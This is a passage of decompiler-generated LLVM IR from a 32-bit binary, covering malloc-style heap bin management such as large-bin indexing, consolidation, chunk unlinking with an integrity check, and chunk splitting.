  %v6_8050255 = or i32 %v5_8050255, 1
  store i32 %v6_8050255, i32* %v4_8050255, align 4
  %v0_805025a = load i32, i32* %eax.global-to-local, align 4
  %v1_805025a = load i32, i32* @ecx, align 4
  %v2_805025a = add i32 %v1_805025a, 12
  %v3_805025a = inttoptr i32 %v2_805025a to i32*
  store i32 %v0_805025a, i32* %v3_805025a, align 4
  %v0_805025d = load i32, i32* @ecx, align 4
  %v1_805025d = load i32, i32* %eax.global-to-local, align 4
  %v2_805025d = add i32 %v1_805025d, 8
  %v3_805025d = inttoptr i32 %v2_805025d to i32*
  store i32 %v0_805025d, i32* %v3_805025d, align 4
  br label %dec_label_pc_8050260

dec_label_pc_8050260:                             ; preds = %dec_label_pc_805021f, %dec_label_pc_805024e
  %v0_8050260 = load i32, i32* @edx, align 4
  %v1_8050260 = add i32 %v0_8050260, 8
  store i32 %v1_8050260, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050909

dec_label_pc_8050268:                             ; preds = %dec_label_pc_8050227
  %v0_805026c = call i32 @__malloc_largebin_index()
  store i32 %v0_805026c, i32* %eax.global-to-local, align 4
  %v3_8050271 = and i8 %v0_80501de, 2
  %v4_8050271 = icmp eq i8 %v3_8050271, 0
  br i1 %v4_8050271, label %dec_label_pc_8050364.preheader, label %dec_label_pc_805027e

dec_label_pc_805027e:                             ; preds = %dec_label_pc_8050268
  store i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32* %stack_var_-92, align 4
  %v2_8050286 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.178 to i32*))
  store i32 %v2_8050286, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050364.preheader

dec_label_pc_8050364.preheader:                   ; preds = %dec_label_pc_805027e, %dec_label_pc_8050231, %dec_label_pc_8050268
  %stack_var_-40.0.ph = phi i32 [ %v2_8050235, %dec_label_pc_8050231 ], [ %v0_805026c, %dec_label_pc_805027e ], [ %v0_805026c, %dec_label_pc_8050268 ]
  %v1_80502ba = add i32 %v1_805057e, 16
  %v0_8050364109 = load i32, i32* @global_var_805e820.182, align 32
  store i32 %v0_8050364109, i32* @ebp, align 4
  %v9_805036a115 = icmp eq i32 %v0_8050364109, 134604820
  %v1_8050370117 = icmp eq i1 %v9_805036a115, false
  br i1 %v1_8050370117, label %dec_label_pc_8050293, label %dec_label_pc_8050376

dec_label_pc_8050293:                             ; preds = %dec_label_pc_8050364.preheader, %bb82
  %v0_8050364118 = phi i32 [ %v0_8050364, %bb82 ], [ %v0_8050364109, %dec_label_pc_8050364.preheader ]
  %v1_8050293 = add i32 %v0_8050364118, 4
  %v2_8050293 = inttoptr i32 %v1_8050293 to i32*
  %v3_8050293 = load i32, i32* %v2_8050293, align 4
  %v1_8050296 = add i32 %v0_8050364118, 12
  %v2_8050296 = inttoptr i32 %v1_8050296 to i32*
  %v3_8050296 = load i32, i32* %v2_8050296, align 4
  store i32 %v3_8050296, i32* @edx, align 4
  %v1_8050299 = and i32 %v3_8050293, -4
  store i32 %v1_8050299, i32* @edi, align 4
  br i1 %v6_805022f, label %dec_label_pc_80502c5, label %dec_label_pc_80502a6

dec_label_pc_80502a6:                             ; preds = %dec_label_pc_8050293
  %v9_80502a6 = icmp eq i32 %v3_8050296, 134604820
  %v1_80502ac = icmp eq i1 %v9_80502a6, false
  br i1 %v1_80502ac, label %dec_label_pc_80502c5, label %dec_label_pc_80502ae

dec_label_pc_80502ae:                             ; preds = %dec_label_pc_80502a6
  %v1_80502ae = load i32, i32* @global_var_805e810.180, align 16
  %v12_80502ae = icmp eq i32 %v0_8050364118, %v1_80502ae
  %v1_80502b4 = icmp eq i1 %v12_80502ae, false
  br i1 %v1_80502b4, label %dec_label_pc_80502c5, label %dec_label_pc_80502b6

dec_label_pc_80502b6:                             ; preds = %dec_label_pc_80502ae
  store i32 %v1_80502ba, i32* %eax.global-to-local, align 4
  %v6_80502bf = icmp ugt i32 %v1_8050299, %v1_80502ba
  br i1 %v6_80502bf, label %dec_label_pc_80508a4, label %dec_label_pc_80502c5

dec_label_pc_80502c5:                             ; preds = %dec_label_pc_80502b6, %dec_label_pc_80502ae, %dec_label_pc_80502a6, %dec_label_pc_8050293
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8050296, i32* @global_var_805e820.182, align 4
  %v2_80502cd = add i32 %v3_8050296, 8
  %v3_80502cd = inttoptr i32 %v2_80502cd to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v3_80502cd, align 4
  %v0_80502d0 = load i32, i32* @edi, align 4
  %v15_80502d0 = icmp eq i32 %v0_80502d0, %v1_805057e
  br i1 %v15_80502d0, label %dec_label_pc_80508e5, label %dec_label_pc_80502da

dec_label_pc_80502da:                             ; preds = %dec_label_pc_80502c5
  %v6_80502e0 = icmp ugt i32 %v0_80502d0, 255
  br i1 %v6_80502e0, label %dec_label_pc_80502f3, label %dec_label_pc_80502e2

dec_label_pc_80502e2:                             ; preds = %dec_label_pc_80502da
  %v2_80502e4 = udiv i32 %v0_80502d0, 8
  store i32 %v2_80502e4, i32* %esi.global-to-local, align 4
  %v1_80502e7 = mul nuw i32 %v2_80502e4, 8
  %v2_80502e7 = add i32 %v1_80502e7, 134604812
  store i32 %v2_80502e7, i32* @ebx, align 4
  %v1_80502ee = add i32 %v1_80502e7, 134604820
  %v2_80502ee = inttoptr i32 %v1_80502ee to i32*
  %v3_80502ee = load i32, i32* %v2_80502ee, align 4
  store i32 %v3_80502ee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805033c

dec_label_pc_80502f3:                             ; preds = %dec_label_pc_80502da
  store i32 %v0_80502d0, i32* @eax, align 4
  %v0_80502f5 = call i32 @__malloc_largebin_index()
  store i32 %v0_80502f5, i32* %esi.global-to-local, align 4
  %v1_80502fc = mul i32 %v0_80502f5, 8
  %v2_80502fc = add i32 %v1_80502fc, ptrtoint (i32* @global_var_805e80c.179 to i32)
  store i32 %v2_80502fc, i32* %eax.global-to-local, align 4
  %v1_8050303 = add i32 %v1_80502fc, add (i32 ptrtoint (i32* @global_var_805e80c.179 to i32), i32 8)
  %v2_8050303 = inttoptr i32 %v1_8050303 to i32*
  %v3_8050303 = load i32, i32* %v2_8050303, align 4
  store i32 %v3_8050303, i32* %edx.global-to-local, align 4
  %v12_8050306 = icmp eq i32 %v3_8050303, %v2_80502fc
  store i32 %v3_8050303, i32* @ebx, align 4
  br i1 %v12_8050306, label %dec_label_pc_805033c, label %dec_label_pc_8050310

dec_label_pc_8050310:                             ; preds = %dec_label_pc_80502f3
  %v1_8050310 = add i32 %v1_80502fc, add (i32 ptrtoint (i32* @global_var_805e80c.179 to i32), i32 12)
  %v2_8050310 = inttoptr i32 %v1_8050310 to i32*
  %v3_8050310 = load i32, i32* %v2_8050310, align 4
  store i32 %v3_8050310, i32* @ebx, align 4
  %v0_8050313 = load i32, i32* @edi, align 4
  %v2_8050313 = add i32 %v3_8050310, 4
  %v3_8050313 = inttoptr i32 %v2_8050313 to i32*
  %v4_8050313 = load i32, i32* %v3_8050313, align 4
  %v10_8050313 = icmp ult i32 %v0_8050313, %v4_8050313
  %v1_8050316 = icmp eq i1 %v10_8050313, false
  br i1 %v1_8050316, label %dec_label_pc_805031e, label %dec_label_pc_805033c

dec_label_pc_805031e:                             ; preds = %dec_label_pc_8050310
  %v1_8050320 = or i32 %v0_8050313, 1
  store i32 %v1_8050320, i32* %eax.global-to-local, align 4
  store i32 %v3_8050303, i32* %ebx.global-to-local, align 4
  %v2_8050334101 = add i32 %v3_8050303, 4
  %v3_8050334102 = inttoptr i32 %v2_8050334101 to i32*
  %v4_8050334103 = load i32, i32* %v3_8050334102, align 4
  %v10_8050334105 = icmp ult i32 %v1_8050320, %v4_8050334103
  br i1 %v10_8050334105, label %dec_label_pc_8050325, label %dec_label_pc_8050339

dec_label_pc_8050325:                             ; preds = %dec_label_pc_805031e, %dec_label_pc_8050325
  %v0_8050339106 = phi i32 [ %v3_8050329, %dec_label_pc_8050325 ], [ %v3_8050303, %dec_label_pc_805031e ]
  store i32 %v0_8050339106, i32* %ecx.global-to-local, align 4
  %v1_8050329 = add i32 %v0_8050339106, 8
  %v2_8050329 = inttoptr i32 %v1_8050329 to i32*
  %v3_8050329 = load i32, i32* %v2_8050329, align 4
  store i32 %v3_8050329, i32* %ecx.global-to-local, align 4
  store i32 %v3_8050329, i32* %ebx.global-to-local, align 4
  %v2_8050334 = add i32 %v3_8050329, 4
  %v3_8050334 = inttoptr i32 %v2_8050334 to i32*
  %v4_8050334 = load i32, i32* %v3_8050334, align 4
  %v10_8050334 = icmp ult i32 %v1_8050320, %v4_8050334
  br i1 %v10_8050334, label %dec_label_pc_8050325, label %dec_label_pc_8050339

dec_label_pc_8050339:                             ; preds = %dec_label_pc_8050325, %dec_label_pc_805031e
  %v0_8050339.lcssa = phi i32 [ %v3_8050303, %dec_label_pc_805031e ], [ %v3_8050329, %dec_label_pc_8050325 ]
  %v1_8050339 = add i32 %v0_8050339.lcssa, 12
  %v2_8050339 = inttoptr i32 %v1_8050339 to i32*
  %v3_8050339 = load i32, i32* %v2_8050339, align 4
  store i32 %v3_8050339, i32* @ebx, align 4
  br label %dec_label_pc_805033c

dec_label_pc_805033c:                             ; preds = %dec_label_pc_80502e2, %dec_label_pc_8050310, %dec_label_pc_80502f3, %dec_label_pc_8050339
  %v0_805033c = phi i32 [ %v0_80502f5, %dec_label_pc_80502f3 ], [ %v0_80502f5, %dec_label_pc_8050339 ], [ %v0_80502f5, %dec_label_pc_8050310 ], [ %v2_80502e4, %dec_label_pc_80502e2 ]
  %stack_var_-64.1 = phi i32 [ %v3_8050303, %dec_label_pc_80502f3 ], [ %v0_8050339.lcssa, %dec_label_pc_8050339 ], [ %v2_80502fc, %dec_label_pc_8050310 ], [ %v3_80502ee, %dec_label_pc_80502e2 ]
  %v1_805033e = urem i32 %v0_805033c, 32
  %v2_805033e = icmp eq i32 %v1_805033e, 0
  store i32 %v1_805033e, i32* %esi.global-to-local, align 4
  store i32 %v1_805033e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8050348 = sdiv i32 %v0_805033c, 32
  store i32 %v2_8050348, i32* %edx.global-to-local, align 4
  br i1 %v2_805033e, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_805033c
  %v5_805034b = shl i32 1, %v1_805033e
  store i32 %v5_805034b, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_805033c, %bb
  %v5_805034d = phi i32 [ 1, %dec_label_pc_805033c ], [ %v5_805034b, %bb ]
  %v1_805034d = mul nsw i32 %v2_8050348, 4
  %v2_805034d = add i32 %v1_805034d, ptrtoint (i32* @global_var_805eb14.183 to i32)
  %v3_805034d = inttoptr i32 %v2_805034d to i32*
  %v4_805034d = load i32, i32* %v3_805034d, align 4
  %v6_805034d = or i32 %v4_805034d, %v5_805034d
  store i32 %v6_805034d, i32* %v3_805034d, align 4
  %v0_8050354 = load i32, i32* @ebx, align 4
  %v1_8050354 = load i32, i32* @ebp, align 4
  %v2_8050354 = add i32 %v1_8050354, 12
  %v3_8050354 = inttoptr i32 %v2_8050354 to i32*
  store i32 %v0_8050354, i32* %v3_8050354, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805035b = load i32, i32* @ebp, align 4
  %v2_805035b = add i32 %v1_805035b, 8
  %v3_805035b = inttoptr i32 %v2_805035b to i32*
  store i32 %stack_var_-64.1, i32* %v3_805035b, align 4
  %v0_805035e = load i32, i32* @ebp, align 4
  %v1_805035e = load i32, i32* @esi, align 4
  %v2_805035e = add i32 %v1_805035e, 12
  %v3_805035e = inttoptr i32 %v2_805035e to i32*
  store i32 %v0_805035e, i32* %v3_805035e, align 4
  %v0_8050361 = load i32, i32* @ebp, align 4
  %v1_8050361 = load i32, i32* @ebx, align 4
  %v2_8050361 = add i32 %v1_8050361, 8
  %v3_8050361 = inttoptr i32 %v2_8050361 to i32*
  store i32 %v0_8050361, i32* %v3_8050361, align 4
  %v0_8050364 = load i32, i32* @global_var_805e820.182, align 32
  store i32 %v0_8050364, i32* @ebp, align 4
  %v9_805036a = icmp eq i32 %v0_8050364, 134604820
  %v1_8050370 = icmp eq i1 %v9_805036a, false
  br i1 %v1_8050370, label %dec_label_pc_8050293, label %dec_label_pc_8050376

dec_label_pc_8050376:                             ; preds = %bb82, %dec_label_pc_8050364.preheader
  br i1 %v8_8050227, label %dec_label_pc_8050404, label %dec_label_pc_8050384

dec_label_pc_8050384:                             ; preds = %dec_label_pc_8050376
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050388 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050388 = add i32 %v1_8050388, ptrtoint (i32* @global_var_805e80c.179 to i32)
  store i32 %v2_8050388, i32* %edx.global-to-local, align 4
  %v1_805038f = add i32 %v1_8050388, add (i32 ptrtoint (i32* @global_var_805e80c.179 to i32), i32 12)
  %v2_805038f = inttoptr i32 %v1_805038f to i32*
  %storemerge1.pre = load i32, i32* %v2_805038f, align 4
  br label %dec_label_pc_8050400

dec_label_pc_8050394:                             ; preds = %dec_label_pc_8050400
  %v1_8050394 = add i32 %v4_80503ab, 4
  %v2_8050394 = inttoptr i32 %v1_8050394 to i32*
  %v3_8050394 = load i32, i32* %v2_8050394, align 4
  store i32 %v3_8050394, i32* %ebx.global-to-local, align 4
  %v1_8050397 = add i32 %v4_80503ab, 12
  %v2_8050397 = inttoptr i32 %v1_8050397 to i32*
  %v3_8050397 = load i32, i32* %v2_8050397, align 4
  store i32 %v3_8050397, i32* @ecx, align 4
  %v1_805039a = and i32 %v3_8050394, -4
  store i32 %v1_805039a, i32* @ebx, align 4
  %v10_805039d = icmp ult i32 %v1_805039a, %v1_805057e
  br i1 %v10_805039d, label %dec_label_pc_8050400, label %dec_label_pc_80503a3

dec_label_pc_80503a3:                             ; preds = %dec_label_pc_8050394
  %v1_80503a3 = add i32 %v4_80503ab, 8
  %v2_80503a3 = inttoptr i32 %v1_80503a3 to i32*
  %v3_80503a3 = load i32, i32* %v2_80503a3, align 4
  store i32 %v3_80503a3, i32* @edx, align 4
  %v1_80503a6 = add i32 %v3_80503a3, 12
  %v2_80503a6 = inttoptr i32 %v1_80503a6 to i32*
  %v3_80503a6 = load i32, i32* %v2_80503a6, align 4
  %v15_80503a6 = icmp eq i32 %v3_80503a6, %v4_80503ab
  %v1_80503a9 = icmp eq i1 %v15_80503a6, false
  br i1 %v1_80503a9, label %dec_label_pc_80503b0, label %dec_label_pc_80503ab

dec_label_pc_80503ab:                             ; preds = %dec_label_pc_80503a3
  %v1_80503ab = add i32 %v3_8050397, 8
  %v2_80503ab = inttoptr i32 %v1_80503ab to i32*
  %v3_80503ab = load i32, i32* %v2_80503ab, align 4
  %v15_80503ab = icmp eq i32 %v3_80503ab, %v4_80503ab
  br i1 %v15_80503ab, label %dec_label_pc_80503b5, label %dec_label_pc_80503b0

dec_label_pc_80503b0:                             ; preds = %dec_label_pc_80503ab, %dec_label_pc_80503a3
  %v0_80503b0 = call i32 @abort()
  store i32 %v0_80503b0, i32* %eax.global-to-local, align 4
  %v0_80503b5.pre = load i32, i32* @ebx, align 4
  %v0_80503bb.pre = load i32, i32* @ecx, align 4
  %v1_80503bb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80503b5

dec_label_pc_80503b5:                             ; preds = %dec_label_pc_80503ab, %dec_label_pc_80503b0
  %v1_80503bb = phi i32 [ %v3_80503a3, %dec_label_pc_80503ab ], [ %v1_80503bb.pre, %dec_label_pc_80503b0 ]
  %v0_80503bb = phi i32 [ %v3_8050397, %dec_label_pc_80503ab ], [ %v0_80503bb.pre, %dec_label_pc_80503b0 ]
  %v0_80503b5 = phi i32 [ %v1_805039a, %dec_label_pc_80503ab ], [ %v0_80503b5.pre, %dec_label_pc_80503b0 ]
  %v5_80503b7 = sub i32 %v0_80503b5, %v1_805057e
  store i32 %v5_80503b7, i32* %esi.global-to-local, align 4
  %v2_80503bb = add i32 %v1_80503bb, 12
  %v3_80503bb = inttoptr i32 %v2_80503bb to i32*
  store i32 %v0_80503bb, i32* %v3_80503bb, align 4
  %v0_80503be = load i32, i32* @edx, align 4
  %v1_80503be = load i32, i32* @ecx, align 4
  %v2_80503be = add i32 %v1_80503be, 8
  %v3_80503be = inttoptr i32 %v2_80503be to i32*
  store i32 %v0_80503be, i32* %v3_80503be, align 4
  %v0_80503c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80503c1 = add i32 %v0_80503c1, 8
  store i32 %v1_80503c1, i32* @ecx, align 4
  %v0_80503c4 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_80503c4, 16
  br i1 %tmp137, label %dec_label_pc_80508f3, label %dec_label_pc_80503cd

dec_label_pc_80503cd:                             ; preds = %dec_label_pc_80503b5
  %v2_80503d1 = add i32 %v0_80503c1, %v1_805057e
  store i32 %v2_80503d1, i32* @edx, align 4
  %v1_80503d4 = or i32 %v1_805057e, 1
  store i32 %v1_80503d4, i32* %ebx.global-to-local, align 4
  %v2_80503d7 = add i32 %v0_80503c1, 4
  %v3_80503d7 = inttoptr i32 %v2_80503d7 to i32*
  store i32 %v1_80503d4, i32* %v3_80503d7, align 4
  %v0_80503da = load i32, i32* %esi.global-to-local, align 4
  %v1_80503dc = or i32 %v0_80503da, 1
  store i32 %v1_80503dc, i32* %eax.global-to-local, align 4
  %v0_80503df = load i32, i32* @edx, align 4
  %v1_80503df = load i32, i32* @ebp, align 4
  %v2_80503df = add i32 %v1_80503df, 8
  %v3_80503df = inttoptr i32 %v2_80503df to i32*
  store i32 %v0_80503df, i32* %v3_80503df, align 4
  %v0_80503e2 = load i32, i32* @edx, align 4
  %v1_80503e2 = load i32, i32* @ebp, align 4
  %v2_80503e2 = add i32 %v1_80503e2, 12
  %v3_80503e2 = inttoptr i32 %v2_80503e2 to i32*
  store i32 %v0_80503e2, i32* %v3_80503e2, align 4
  %v0_80503e5 = load i32, i32* @edx, align 4
  %v1_80503e5 = add i32 %v0_80503e5, 8
  %v2_80503e5 = inttoptr i32 %v1_80503e5 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_80503e5, align 4
  %v0_80503ec = load i32, i32* @edx, align 4
  %v1_80503ec = add i32 %v0_80503ec, 12
  %v2_80503ec = inttoptr i32 %v1_80503ec to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_80503ec, align 4
  %v0_80503f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80503f3 = load i32, i32* @edx, align 4
  %v2_80503f3 = add i32 %v1_80503f3, 4
  %v3_80503f3 = inttoptr i32 %v2_80503f3 to i32*
  store i32 %v0_80503f3, i32* %v3_80503f3, align 4
  %v0_80503f6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80503f6 = load i32, i32* @edx, align 4
  %v3_80503f6 = add i32 %v1_80503f6, %v0_80503f6
  %v4_80503f6 = inttoptr i32 %v3_80503f6 to i32*
  store i32 %v0_80503f6, i32* %v4_80503f6, align 4
  br label %dec_label_pc_80508f8

dec_label_pc_8050400:                             ; preds = %dec_label_pc_8050394, %dec_label_pc_8050384
  %v4_80503ab = phi i32 [ %storemerge1.pre, %dec_label_pc_8050384 ], [ %v3_8050397, %dec_label_pc_8050394 ]
  store i32 %v4_80503ab, i32* %eax.global-to-local, align 4
  %v12_8050400 = icmp eq i32 %v4_80503ab, %v2_8050388
  %v1_8050402 = icmp eq i1 %v12_8050400, false
  br i1 %v1_8050402, label %dec_label_pc_8050394, label %dec_label_pc_8050404.loopexit

dec_label_pc_8050404.loopexit:                    ; preds = %dec_label_pc_8050400
  br label %dec_label_pc_8050404

dec_label_pc_8050404:                             ; preds = %dec_label_pc_8050404.loopexit, %dec_label_pc_8050376
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805040d = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_805040d, i32* %ecx.global-to-local, align 4
  %v2_8050410 = udiv i32 %v1_805040d, 32
  store i32 %v2_8050410, i32* @edi, align 4
  %v1_8050413 = mul nuw nsw i32 %v2_8050410, 4
  %v2_8050413 = add i32 %v1_8050413, ptrtoint (i32* @global_var_805eb14.183 to i32)
  %v3_8050413 = inttoptr i32 %v2_8050413 to i32*
  %v4_8050413 = load i32, i32* %v3_8050413, align 4
  store i32 %v4_8050413, i32* %edx.global-to-local, align 4
  %v1_805041a = mul i32 %v1_805040d, 8
  %v2_805041a = add i32 %v1_805041a, ptrtoint (i32* @global_var_805e80c.179 to i32)
  store i32 %v2_805041a, i32* %ebx.global-to-local, align 4
  %v1_8050421 = urem i32 %v1_805040d, 32
  %v2_8050421 = icmp eq i32 %v1_8050421, 0
  store i32 %v1_8050421, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050421, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8050404
  %v5_8050424 = shl i32 1, %v1_8050421
  store i32 %v5_8050424, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8050404, %bb83, %dec_label_pc_8050465
  %v1_8050426 = phi i32 [ %v1_8050426.pre, %dec_label_pc_8050465 ], [ %v4_8050413, %bb83 ], [ %v4_8050413, %dec_label_pc_8050404 ]
  %v0_805042a = phi i32 [ %v0_8050426.pre, %dec_label_pc_8050465 ], [ %v5_8050424, %bb83 ], [ 1, %dec_label_pc_8050404 ]
  %tmp84 = icmp ule i32 %v0_805042a, %v1_8050426
  %v1_805042a = icmp eq i32 %v0_805042a, 0
  %v1_805042c = icmp eq i1 %v1_805042a, false
  %or.cond = and i1 %tmp84, %v1_805042c
  br i1 %or.cond, label %dec_label_pc_805042a.dec_label_pc_805045a.preheader_crit_edge, label %dec_label_pc_805042e.preheader

dec_label_pc_805042a.dec_label_pc_805045a.preheader_crit_edge: ; preds = %.preheader
  %v0_805045512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805045a.preheader

dec_label_pc_805042e.preheader:                   ; preds = %.preheader
  %v0_805042e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805042e

dec_label_pc_805042e:                             ; preds = %dec_label_pc_805042e.preheader, %dec_label_pc_8050438
  %v0_805042e = phi i32 [ %v0_805042e.pre, %dec_label_pc_805042e.preheader ], [ %v1_805042e, %dec_label_pc_8050438 ]
  %v1_805042e = add i32 %v0_805042e, 1
  store i32 %v1_805042e, i32* @edi, align 4
  %v6_8050432 = icmp ugt i32 %v1_805042e, 2
  br i1 %v6_8050432, label %dec_label_pc_80504e9.loopexit, label %dec_label_pc_8050438

dec_label_pc_8050438:                             ; preds = %dec_label_pc_805042e
  %v1_8050438 = mul i32 %v1_805042e, 4
  %v2_8050438 = add i32 %v1_8050438, ptrtoint (i32* @global_var_805eb14.183 to i32)
  %v3_8050438 = inttoptr i32 %v2_8050438 to i32*
  %v4_8050438 = load i32, i32* %v3_8050438, align 4
  store i32 %v4_8050438, i32* %edx.global-to-local, align 4
  %v1_805043f = icmp eq i32 %v4_8050438, 0
  br i1 %v1_805043f, label %dec_label_pc_805042e, label %dec_label_pc_8050443

dec_label_pc_8050443:                             ; preds = %dec_label_pc_8050438
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805044a = mul i32 %v1_805042e, 256
  store i32 %v2_805044a, i32* %eax.global-to-local, align 4
  %v1_805044d = add i32 %v2_805044a, ptrtoint (i32* @global_var_805e80c.179 to i32)
  store i32 %v1_805044d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805045a.preheader

dec_label_pc_805045a.preheader:                   ; preds = %dec_label_pc_805042a.dec_label_pc_805045a.preheader_crit_edge, %dec_label_pc_8050443
  %v0_805045512 = phi i32 [ %v1_805044d, %dec_label_pc_8050443 ], [ %v0_805045512.pre, %dec_label_pc_805042a.dec_label_pc_805045a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8050443 ], [ %v0_805042a, %dec_label_pc_805042a.dec_label_pc_805045a.preheader_crit_edge ]
  %v0_805046b = phi i32 [ %v4_8050438, %dec_label_pc_8050443 ], [ %v1_8050426, %dec_label_pc_805042a.dec_label_pc_805045a.preheader_crit_edge ]
  %v2_805045a4 = and i32 %v0_805046b, %esi.promoted
  %v3_805045a5 = icmp eq i32 %v2_805045a4, 0
  br i1 %v3_805045a5, label %dec_label_pc_8050455, label %dec_label_pc_805045e

dec_label_pc_8050455:                             ; preds = %dec_label_pc_805045a.preheader, %dec_label_pc_8050455
  %v2_805045814 = phi i32 [ %v2_8050458, %dec_label_pc_8050455 ], [ %esi.promoted, %dec_label_pc_805045a.preheader ]
  %v0_805045513 = phi i32 [ %v1_8050455, %dec_label_pc_8050455 ], [ %v0_805045512, %dec_label_pc_805045a.preheader ]
  %v1_8050455 = add i32 %v0_805045513, 8
  %v2_8050458 = mul i32 %v2_805045814, 2
  %v2_805045a = and i32 %v2_8050458, %v0_805046b
  %v3_805045a = icmp eq i32 %v2_805045a, 0
  br i1 %v3_805045a, label %dec_label_pc_8050455, label %dec_label_pc_805045a.dec_label_pc_805045e_crit_edge

dec_label_pc_805045a.dec_label_pc_805045e_crit_edge: ; preds = %dec_label_pc_8050455
  store i32 %v1_8050455, i32* %ebx.global-to-local, align 4
  store i32 %v2_8050458, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805045e

dec_label_pc_805045e:                             ; preds = %dec_label_pc_805045a.dec_label_pc_805045e_crit_edge, %dec_label_pc_805045a.preheader
  %v0_8050465 = phi i32 [ %v2_8050458, %dec_label_pc_805045a.dec_label_pc_805045e_crit_edge ], [ %esi.promoted, %dec_label_pc_805045a.preheader ]
  %v1_8050488 = phi i32 [ %v1_8050455, %dec_label_pc_805045a.dec_label_pc_805045e_crit_edge ], [ %v0_805045512, %dec_label_pc_805045a.preheader ]
  %v1_805045e = add i32 %v1_8050488, 12
  %v2_805045e = inttoptr i32 %v1_805045e to i32*
  %v3_805045e = load i32, i32* %v2_805045e, align 4
  store i32 %v3_805045e, i32* @ecx, align 4
  %v12_8050461 = icmp eq i32 %v3_805045e, %v1_8050488
  %v1_8050463 = icmp eq i1 %v12_8050461, false
  br i1 %v1_8050463, label %dec_label_pc_8050479, label %dec_label_pc_8050465

dec_label_pc_8050465:                             ; preds = %dec_label_pc_805045e
  %v2_8050467 = mul i32 %v0_8050465, 2
  store i32 %v2_8050467, i32* %esi.global-to-local, align 4
  %v1_8050469 = sub i32 -1, %v0_8050465
  store i32 %v1_8050469, i32* %eax.global-to-local, align 4
  %v2_805046b = and i32 %v0_805046b, %v1_8050469
  store i32 %v2_805046b, i32* %edx.global-to-local, align 4
  %v1_805046d = add i32 %v3_805045e, 8
  store i32 %v1_805046d, i32* %ebx.global-to-local, align 4
  %v1_8050470 = load i32, i32* @edi, align 4
  %v2_8050470 = mul i32 %v1_8050470, 4
  %v3_8050470 = add i32 %v2_8050470, ptrtoint (i32* @global_var_805eb14.183 to i32)
  %v4_8050470 = inttoptr i32 %v3_8050470 to i32*
  store i32 %v2_805046b, i32* %v4_8050470, align 4
  %v0_8050426.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8050426.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050479:                             ; preds = %dec_label_pc_805045e
  %v1_8050479 = add i32 %v3_805045e, 4
  %v2_8050479 = inttoptr i32 %v1_8050479 to i32*
  %v3_8050479 = load i32, i32* %v2_8050479, align 4
  store i32 %v3_8050479, i32* %edx.global-to-local, align 4
  %v1_805047c = add i32 %v3_805045e, 12
  %v2_805047c = inttoptr i32 %v1_805047c to i32*
  %v3_805047c = load i32, i32* %v2_805047c, align 4
  store i32 %v3_805047c, i32* %eax.global-to-local, align 4
  %v1_805047f = and i32 %v3_8050479, -4
  store i32 %v1_805047f, i32* @edx, align 4
  %v5_8050484 = sub i32 %v1_805047f, %v1_805057e
  store i32 %v5_8050484, i32* %esi.global-to-local, align 4
  store i32 %v3_805047c, i32* %v2_805045e, align 4
  %v0_805048b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805048b = load i32, i32* %eax.global-to-local, align 4
  %v2_805048b = add i32 %v1_805048b, 8
  %v3_805048b = inttoptr i32 %v2_805048b to i32*
  store i32 %v0_805048b, i32* %v3_805048b, align 4
  %v0_805048e = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_805048e, 16
  %v0_8050493 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_8050493, label %dec_label_pc_805049a

dec_label_pc_8050493:                             ; preds = %dec_label_pc_8050479
  %v1_8050493 = load i32, i32* @edx, align 4
  %v2_8050493 = add i32 %v0_8050493, 4
  %v3_8050493 = add i32 %v2_8050493, %v1_8050493
  %v4_8050493 = inttoptr i32 %v3_8050493 to i32*
  %v5_8050493 = load i32, i32* %v4_8050493, align 4
  %v6_8050493 = or i32 %v5_8050493, 1
  store i32 %v6_8050493, i32* %v4_8050493, align 4
  br label %dec_label_pc_80504e1

dec_label_pc_805049a:                             ; preds = %dec_label_pc_8050479
  %v2_805049e = add i32 %v0_8050493, %v1_805057e
  store i32 %v2_805049e, i32* %eax.global-to-local, align 4
  %v1_80504a7 = load i32, i32* @ebp, align 4
  %v2_80504a7 = add i32 %v1_80504a7, 8
  %v3_80504a7 = inttoptr i32 %v2_80504a7 to i32*
  store i32 %v2_805049e, i32* %v3_80504a7, align 4
  %v0_80504aa = load i32, i32* %eax.global-to-local, align 4
  %v1_80504aa = load i32, i32* @ebp, align 4
  %v2_80504aa = add i32 %v1_80504aa, 12
